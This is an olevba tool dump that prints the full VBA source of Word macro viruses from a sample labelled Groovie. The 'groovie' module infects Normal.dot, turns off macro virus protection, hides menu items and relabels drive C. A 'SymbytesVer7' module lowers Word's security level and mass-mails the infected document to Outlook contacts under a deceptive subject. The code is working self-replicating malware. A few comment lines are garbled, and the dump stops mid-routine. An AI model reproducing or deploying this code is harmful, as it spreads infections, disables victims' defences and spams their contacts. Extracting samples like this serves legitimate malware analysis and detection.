olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie-865264067639a4539e2ffcc4ae8352c72560286a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Groovie-865264067639a4539e2ffcc4ae8352c72560286a 
in file: Virus.MSWord.Groovie-865264067639a4539e2ffcc4ae8352c72560286a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I02 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I03 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I04 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I05 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I06 As String
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I07 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I08 As Boolean
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I09()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = NormalTemplate Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I01 = "normal"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        GoTo checkout
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
checkout:
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I10()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I11()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I09
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I10
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "document" Then Call I12
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "normal" Then Call I13
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "orbit" Then Call I14
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I12()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I03 = False And I05 = False Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With NormalTemplate.VBProject
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Shell ("label c: groovie"), 0
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I13()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I17
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I04 = False And I07 = True Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With ActiveDocument.VBProject
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Execute
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = True Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = False Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Documents.Add Template:="", NewTemplate:=False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I14()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I03 = False And I05 = False Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With NormalTemplate.VBProject
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            NormalTemplate.Save
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I04 = False Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With ActiveDocument.VBProject
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
  M70.11:101AdesMr1H eke 9Cio \EVRTNEA-A
      EdWt
 7.111dsrHee9i ERNAA   EW
711sHeiENA E
1seEWith Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Execute
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I15()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.VirusProtection = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.SaveNormalPrompt = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.ConfirmConversions = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I06 = ActiveDocument.FullName
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I11
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoOpen()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoClose()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoExit()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileSaveAs()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFileSaveAs).Show
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub filesave()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileclose()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.Close
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileprint()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFilePrint).Show
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ViewVBCode()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
MsgBox "It's GROOVIE", vbOKOnly, "�  ALT-F11  � says..."
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileTemplates()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I17()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error GoTo docek
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If ActiveDocument.Name <> "" Then
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I07 = True
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    GoTo over
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
docek:
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I07 = False
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
over:
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I16()
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Randomize
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rn = Int(Rnd * 999)
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 2 To 358 Step 2
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.DeleteLines x
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
 ' AM07.03.01 10:01:0214Andreas Marx14HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
Attribute VB_Name = "SymbytesVer7"
Attribute VB_Base = "0{00020906-0000-0000-C000-000000000046}"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SymbytesVer7?") <> "... by Kwyjibo" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BreakUmOffASlice.Recipients.Add Peep
            x = x + 1
            If x > 50 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = "Impotent Massage From " & Application.UserName
         BreakUmOffASlice.Body = "Hear iz dat document you aksed for ... don't show no one else ;-)"
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = ""
    Next y
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SymbytesVer7?") = "... by Kwyjibo"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "SymbytesVer7" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "SymbytesVer7"
DoAD = True
End If
If NTI1.Name <> "SymbytesVer7" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "SymbytesVer7"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
